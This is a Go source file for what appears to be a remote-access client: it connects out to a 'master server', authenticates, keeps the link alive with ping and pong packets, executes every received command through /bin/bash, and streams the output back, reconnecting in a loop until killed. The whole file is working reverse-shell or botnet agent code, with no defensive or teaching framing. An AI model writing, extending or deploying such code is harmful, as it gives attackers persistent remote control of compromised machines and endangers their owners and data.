package main

import (
	"bufio"
	"bytes"
	"context"
	"net"
	"os/exec"
	"time"
)

type Client struct {
	Conn 	net.Conn
	Reader 	*bufio.Reader
	Status 	bool
}

func (c *Client) Close() {
	c.Status = false
	_ = c.Conn.Close()
}

// ExecCommand runs a given command using
func (c *Client) ExecCommand(command string) {
	var cmd *exec.Cmd

	_, err := c.Conn.Write(c.Packet([]byte("COMMAND_OUTPUT_BEGIN:" + command)))

	// Running CMD in the background
	ctxBG := context.Background()
	// If the command takes longer than 10 minutes to execute we will stop its execution
	ctx, cancel := context.WithTimeout(ctxBG, 10 * time.Minute)
	defer cancel()

	// Running the command inside the /bin/bash shell
	cmd = exec.CommandContext(ctx, "/bin/bash", "-c", command)

	// Redirecting output as well as errors to the master server
	cmd.Stdout = c.Conn
	cmd.Stderr = c.Conn

	err = cmd.Start()
	if err != nil { return }

	// Waiting for it to end
	err = cmd.Wait()
	if err != nil { return }

	_, err = c.Conn.Write(c.Packet([]byte("COMMAND_OUTPUT_END:" + command)))
	if err != nil { c.Close() }
}

// OpenConnection is pretty self explanatory as the name literally says what it does = ]
func (c *Client) OpenConnection() bool {
	conn, err := net.Dial("tcp", server)
	if err != nil { return false }

	c.Conn = conn
	return true
}

// Read is used to receive commands from the master server
func (c *Client) Read() ([]byte, error) {
	// Reading the channel until we find a '\n'
	data, err := c.Reader.ReadBytes(delimiter)
	// If any errors occur we just return them and a empty byte slice
	if err != nil { return []byte{}, err }

	// Returning the output without the '\n' character
	return data[:len(data) - 1], nil
}

// Packet is a simple function that just appends the delimiter to the data
func (c *Client) Packet(data []byte) []byte {
	return append(data, delimiter)
}

// InitReader gets called everytime we connect/re-connect to the master server
func (c *Client) InitReader() {
	c.Reader = bufio.NewReader(c.Conn)
}

// MainLoop is the function that keeps the connection alive and makes sure it retries to connect
// until it is killed.
func (c *Client) MainLoop() {
	var cmd []byte
	var connected bool
	var err 	error

	for {
		connected = c.OpenConnection()
		if !connected { goto eol }
		c.InitReader()

		// Sleeping to leave the server enough time to take our auth payload just in case its not listening yet :D
		time.Sleep(1 * time.Second)

		// Trying to send the auth packet, if something goes wrong we reconnect and try again
		_, err = c.Conn.Write(c.Packet(authPayload))
		if err != nil { goto eol }

		c.Status = true

		for c.Status {
			cmd, err = c.Read()
			if err != nil { goto eol }

			if bytes.Equal(cmd, pingPacket) {
				_, err = c.Conn.Write(c.Packet(pongPacket))
				if err != nil { goto eol }
			} else {
				c.ExecCommand(string(cmd))
			}
		}

	eol:
		time.Sleep(1 * time.Second)
	}

}